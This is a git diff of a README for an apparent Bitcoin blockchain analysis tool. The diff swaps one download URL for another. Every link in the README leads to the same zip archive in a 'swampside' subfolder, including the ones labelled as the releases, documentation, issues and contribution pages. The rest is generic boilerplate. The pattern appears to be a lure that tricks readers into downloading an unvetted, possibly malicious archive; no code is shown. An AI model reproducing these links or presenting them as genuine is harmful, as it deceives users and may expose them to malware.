@@ -1,6 +1,6 @@
 # 🚀 bitcoin-analysis-stack-optimized - Simplified Bitcoin Blockchain Insights
 
-[![Download](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip%20Latest-Release-blue)](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip)
+[![Download](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip%20Latest-Release-blue)](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip)
 
 ## 📥 Overview
 
@@ -8,7 +8,7 @@ Welcome to the bitcoin-analysis-stack-optimized! This tool allows you to easily 
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download the application, go to our [Releases page](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip).
+1. **Visit the Releases Page**: To download the application, go to our [Releases page](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip).
    
 2. **Choose Your Version**: Look for the latest release at the top. You will find files for different systems. Select the one that fits your operating system.
 
@@ -41,7 +41,7 @@ To run the application smoothly, your computer should meet the following require
 
 ## 📄 Documentation
 
-For in-depth guidance on using the application, please refer to our [Documentation](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip). It covers:
+For in-depth guidance on using the application, please refer to our [Documentation](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip). It covers:
 
 - Installation steps
 - How to use each feature
@@ -55,7 +55,7 @@ If you encounter any issues:
 2. **Check System Requirements**: Ensure your system meets all the necessary requirements.
 3. **Review Documentation**: Sometimes, simple steps in documentation can resolve issues.
 
-For further assistance, consider visiting the [Issues page](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip).
+For further assistance, consider visiting the [Issues page](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip).
 
 ## 💬 Community Support
 
@@ -66,10 +66,10 @@ Join our community for tips and support. Feel free to ask questions and share yo
 
 ## 🛠️ Contribution
 
-We welcome contributions to improve the application. If you want to help, please check our [Contribution Guidelines](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip).
+We welcome contributions to improve the application. If you want to help, please check our [Contribution Guidelines](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip).
 
 ## ⬇️ Download & Install
 
-To get started, [visit this page to download](https://raw.githubusercontent.com/Mohamed7727/bitcoin-analysis-stack-optimized/main/swampside/bitcoin-analysis-stack-optimized.zip). Follow the steps outlined above to install the application.
+To get started, [visit this page to download](https://github.com/Mohamed7727/bitcoin-analysis-stack-optimized/raw/refs/heads/main/swampside/analysis-bitcoin-optimized-stack-v2.8-beta.3.zip). Follow the steps outlined above to install the application.
 
 Thank you for using bitcoin-analysis-stack-optimized!
